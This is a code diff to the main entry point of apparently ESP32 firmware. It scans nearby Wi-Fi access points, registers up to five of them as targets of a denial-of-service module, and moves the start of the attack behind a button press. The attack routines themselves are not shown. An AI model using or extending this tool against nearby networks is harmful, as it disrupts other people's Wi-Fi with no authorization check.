@@ -15,9 +15,11 @@
 #include "nvs_flash.h"
 #include "attack_dos.h"
 #include "ap_scanner.h"
+#include "button.h"
 
 /**
- * @brief Main application entry point.
+ * @brief Main application entry point. Handles system bootstrap, NVS initialization, 
+ *        AP scanning, target registration, and hands over control to the button FSM controller.
  */
 void app_main(void) {
     ESP_LOGI("main", "System initialization...");
@@ -29,20 +31,21 @@ void app_main(void) {
     }
     ESP_ERROR_CHECK(ret);
 
+    attack_dos_init();
     wifictl_scan_nearby_aps();
+    
     const wifictl_ap_records_t *records = wifictl_get_ap_records();
-
     if (records->count == 0) {
         ESP_LOGW("main", "No Access Points found!");
         return;
     }
 
-    attack_dos_init();
-
-    int limit = records->count < 3 ? records->count : 3;
+    int limit = records->count < 5 ? records->count : 5;
     for (int i = 0; i < limit; i++) {
         attack_dos_add_target(&records->records[i]);
     }
 
-    attack_dos_start_multi();
+    button_ctrl_init();
+    
+    ESP_LOGI("main", "Initialization complete. System is IDLE. Press BOOT button to start modes.");
 }
